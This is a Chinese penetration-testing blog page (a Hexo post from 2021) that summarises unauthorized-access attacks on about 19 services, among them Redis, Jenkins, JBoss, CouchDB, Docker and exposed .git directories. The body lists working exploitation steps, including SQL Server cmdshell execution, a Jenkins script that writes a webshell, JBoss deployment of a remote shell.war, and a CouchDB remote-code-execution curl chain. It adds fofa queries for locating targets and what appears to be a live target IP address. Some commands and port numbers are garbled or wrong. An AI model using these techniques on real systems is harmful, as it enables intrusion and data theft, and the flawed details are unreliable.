@@ -1,0 +1,893 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="未授权访问," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="前言未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。 mysql3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell 工具：Navicat sqlserver1433端口未授权访问，可读取数据库内容，可尝试执行master..cmd">
+<meta name="keywords" content="未授权访问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见未授权访问漏洞总结">
+<meta property="og:url" content="http://yoursite.com/2021/01/10/常见未授权访问漏洞总结/index.html">
+<meta property="og:site_name" content="Leticia&#39;s Blog">
+<meta property="og:description" content="前言未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。 mysql3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell 工具：Navicat sqlserver1433端口未授权访问，可读取数据库内容，可尝试执行master..cmd">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-01-10T10:21:35.398Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见未授权访问漏洞总结">
+<meta name="twitter:description" content="前言未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。 mysql3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell 工具：Navicat sqlserver1433端口未授权访问，可读取数据库内容，可尝试执行master..cmd">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/01/10/常见未授权访问漏洞总结/"/>
+
+
+
+
+
+  <title> 常见未授权访问漏洞总结 | Leticia's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Leticia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/10/常见未授权访问漏洞总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                常见未授权访问漏洞总结
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-10T18:18:52+08:00">
+                2021-01-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/01/10/常见未授权访问漏洞总结/" class="leancloud_visitors" data-flag-title="常见未授权访问漏洞总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。</p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell</p>
+<p>工具：Navicat</p>
+<h2 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h2><p>1433端口未授权访问，可读取数据库内容，可尝试执行master..cmdshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.xp..cmdshell &apos;whoami&apos;</span><br><span class="line">exec master..cmdshell &apos;dir c:\&apos;</span><br></pre></td></tr></table></figure></p>
+<p>工具：Navicat</p>
+<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>27017端口未授权访问，可读取数据库内容</p>
+<p>工具：Navicat，Robo3T</p>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>27017端口未授权访问，可读取数据库内容</p>
+<p>可通过四种方式getshell：写webshell、写crontabs、写ssh公钥、Redis主从复制(4.x,5.x)</p>
+<p>工具：Redis-cli,fofa:protocol=redis</p>
+<h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoop webUI界面未授权访问，如果存在New Application API功能，可尝试getshell</p>
+<p>工具：浏览器，<a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></p>
+<h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><p>9200端口未授权访问，可非法操作数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ip:9200/_plugin/head/  web管理界面</span><br><span class="line">http://ip:9200/_cat/indices  查看集群当前状态</span><br><span class="line">http://ip:9200/_nodes  查看节点数据</span><br><span class="line">http://ip:9200/_river/_search  查看数据库敏感信息</span><br></pre></td></tr></table></figure></p>
+<p>工具：浏览器</p>
+<h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>2181，2182端口未授权访问，可读取敏感信息，或者在Zookeeper集群内执行kill命令</p>
+<p>工具：netcat，<a href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip" target="_blank" rel="noopener">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<h2 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h2><p>SpringBoot，web中env路径配置文件未授权访问，可暴露大量联动设备密码信息</p>
+<p>工具：浏览器</p>
+<h2 id="ds-store"><a href="#ds-store" class="headerlink" title="ds_store"></a>ds_store</h2><p><a href="http://ip/.ds_store未授权访问，可通过github工具下载web目录" target="_blank" rel="noopener">http://ip/.ds_store未授权访问，可通过github工具下载web目录</a></p>
+<p>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a></p>
+<h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>vnc用于远程桌面控制，默认端口在5900-5905之间，此类端口未授权访问会导致恶意用户直接控制受控主机</p>
+<p>工具：VNCview</p>
+<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>docker的2375端口web未授权访问，可通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等</p>
+<p>工具：浏览器</p>
+<h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><p>Jenkins面板<a href="http://ip:8080/manage" target="_blank" rel="noopener">http://ip:8080/manage</a><br>未授权访问会允许用户选择执行脚本界面，操作一些系统层命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &quot;whoami&quot;.execute().text 命令执行</span><br><span class="line">new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;); 写webshell</span><br></pre></td></tr></table></figure>
+<p>工具：浏览器</p>
+<h2 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h2><p>Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet ip 11211 或 nc -vv &lt;target&gt; 11211</span><br><span class="line">无需用户名密码，可以直接连接memcache服务的11211端口</span><br><span class="line">stats #查看memcache服务状态</span><br></pre></td></tr></table></figure>
+<p>工具：netcat，telnet</p>
+<h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>JBOSS的webUI界面<a href="http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell" target="_blank" rel="noopener">http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">点击JMX CONSOLE未授权访问</span><br><span class="line">点击jboss.deployment中的deploymentScanner进入应用部署页面</span><br><span class="line">使用apache搭建远程木马服务器shell.war</span><br><span class="line">addurl-java.lang.String配置访问木马地址http://&lt;ip&gt;/shell.war</span><br><span class="line">访问http://ip:8080/shell/</span><br></pre></td></tr></table></figure>
+<p><a href="http://221.229.247.184:8080/jmx-console/" target="_blank" rel="noopener">http://221.229.247.184:8080/jmx-console/</a></p>
+<p>工具：浏览器，fofa：”JBoss Management”</p>
+<h2 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h2><p>.svn目录未授权访问，可能导致大量源码泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn-extractor.py --url &quot;url with .svn available&quot;</span><br></pre></td></tr></table></figure>
+<p>工具：<a href="https://github.com/anantshri/svn-extractor" target="_blank" rel="noopener">https://github.com/anantshri/svn-extractor</a></p>
+<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>.git目录未授权访问，可能导致大量源码泄露</p>
+<p>方法1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -r -p -np -k http://www.xxx.com/.git/ #先递归批量下载.git目录</span><br><span class="line">git log #查看网站的提交记录</span><br><span class="line">git reset --hard [log hash] #恢复到指定版本号</span><br></pre></td></tr></table></figure></p>
+<p>方法2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.xxx.com/.git/</span><br></pre></td></tr></table></figure></p>
+<p>工具：git,<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
+<h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install nfs-common 安装nfs客户端</span><br><span class="line">showmount -e xx.xx.xx.xx 查看nfs服务器上的共享目录</span><br><span class="line">mount -t nfs xx.xx.xx.xx:/grdata /mnt 挂载到本地</span><br><span class="line">umount /mnt 卸载目录</span><br></pre></td></tr></table></figure>
+<h2 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h2><p>CouchDB的webui未授权访问时，可通过 <a href="http://xx.xx.xx.xx:5984/_utils/" target="_blank" rel="noopener">http://xx.xx.xx.xx:5984/_utils/</a> 页面创建管理员用户，并通过put方式远程代码执行（CVE-2017-12635）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure>
+<p>工具：curl，<a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/未授权访问/" rel="tag"># 未授权访问</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/24/redis未授权getshell的多种方式/" rel="next" title="redis未授权getshell的多种方式">
+                <i class="fa fa-chevron-left"></i> redis未授权getshell的多种方式
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="麻薯" />
+          <p class="site-author-name" itemprop="name">麻薯</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">120</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">72</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+		
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql"><span class="nav-number">2.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlserver"><span class="nav-number">3.</span> <span class="nav-text">sqlserver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MongoDB"><span class="nav-number">4.</span> <span class="nav-text">MongoDB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis"><span class="nav-number">5.</span> <span class="nav-text">Redis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hadoop"><span class="nav-number">6.</span> <span class="nav-text">Hadoop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elasticsearch"><span class="nav-number">7.</span> <span class="nav-text">Elasticsearch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZooKeeper"><span class="nav-number">8.</span> <span class="nav-text">ZooKeeper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpringBoot"><span class="nav-number">9.</span> <span class="nav-text">SpringBoot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ds-store"><span class="nav-number">10.</span> <span class="nav-text">ds_store</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VNC"><span class="nav-number">11.</span> <span class="nav-text">VNC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker"><span class="nav-number">12.</span> <span class="nav-text">Docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jenkins"><span class="nav-number">13.</span> <span class="nav-text">Jenkins</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Memcached"><span class="nav-number">14.</span> <span class="nav-text">Memcached</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JBOSS"><span class="nav-number">15.</span> <span class="nav-text">JBOSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#svn"><span class="nav-number">16.</span> <span class="nav-text">svn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#git"><span class="nav-number">17.</span> <span class="nav-text">git</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nfs"><span class="nav-number">18.</span> <span class="nav-text">nfs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CouchDB"><span class="nav-number">19.</span> <span class="nav-text">CouchDB</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">麻薯</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
+</body>
+</html>
